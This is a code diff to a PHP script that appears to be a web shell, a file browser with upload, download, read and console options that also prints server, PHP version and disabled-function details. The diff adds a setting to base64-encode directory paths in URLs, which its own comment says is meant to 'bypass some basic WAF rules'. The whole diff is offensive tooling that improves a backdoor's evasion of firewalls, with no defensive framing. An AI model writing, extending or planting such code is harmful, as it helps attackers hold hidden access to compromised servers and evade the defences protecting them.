@@ -33,6 +33,9 @@ $console = false;
 
 $timezone = 'Europe/Prague';
 
+/* encode paths in url to bypass some basic WAF rules */
+$base64_paths = false;
+
 /* =============== END SETTINGS =============== */
 
 /* authentification */
@@ -72,9 +75,9 @@ if ($download && isset($_GET['down'])) {
   download($_GET['down'], $method);
 }
 
-main(__DIR__, $download, $upload, $read, $console, $method);
+main(__DIR__, $download, $upload, $read, $console, $method, $base64_paths);
 
-function main($dir, $download, $upload, $read, $console, $method)
+function main($dir, $download, $upload, $read, $console, $method, $base64_paths)
 {
   echo "<style>body{font-family:monospace;}td{padding:2px 4px;}tr:nth-child(even),pre{background-color: #f4f4f4;}a:hover{color:#008fff}</style>";
   echo "<style>@media (prefers-color-scheme: dark){body{background-color: #151619;color: #fff;}a{color:#b6ff00}a:visited{color:#78a900}a:hover{color:#e6f939}tr:nth-child(even),pre{background-color: #333;}}</style>";
@@ -97,7 +100,7 @@ function main($dir, $download, $upload, $read, $console, $method)
   }
 
 
-  $dir = isset($_GET['dir']) ? $_GET['dir'] : $dir;
+  $dir = isset($_GET['dir']) ? ($base64_paths?base64_decode($_GET['dir']):$_GET['dir']) : $dir;
 
   echo "<h2>File browser</h2>";
 
@@ -116,15 +119,18 @@ function main($dir, $download, $upload, $read, $console, $method)
   echo "<table border='1' style='border-collapse:collapse'>";
 
   foreach ($files as $file) {
+
+    $file_path = $base64_paths?base64_encode($file["path"]):$file["path"];
+   
     echo "<tr>";
     echo "<td>";
     if ($file['isDir']) {
       if ($file['name'] === '..')
-        echo "<a href='?m=$method&dir={$file["path"]}'>[ UP ]</a>";
+        echo "<a href='?m=$method&dir={$file_path}'>[ UP ]</a>";
       elseif ($file['name'] === '.')
         echo $file['path'];
       else
-        echo "<a href='?m=$method&dir={$file["path"]}'>{$file["name"]}</a>";
+        echo "<a href='?m=$method&dir={$file_path}'>{$file["name"]}</a>";
     } else {
       echo $file["name"];
     }
@@ -145,7 +151,7 @@ function main($dir, $download, $upload, $read, $console, $method)
 
   echo "<h2>Information</h2>";
 
-  echo '<p><b>Current script:</b> <a href="?dir=' . __DIR__ . '">' . __FILE__ . '</a></p>';
+  echo '<p><b>Current script:</b> <a href="?dir=' . ($base64_paths ? base64_encode(__DIR__): __DIR__) . '">'. __FILE__ . '</a></p>';
   echo '<p><b>PHP version:</b> ' . phpversion() . ' @ ' . php_uname() . ' [' . php_sapi_name() . ']</p>';
   echo '<p><b>PHP extensions:</b> ' . implode(', ', get_loaded_extensions()) . '</p>';
   echo '<p><b>PHP disable functions:</b> ' . ini_get('disable_functions') . '</p>';
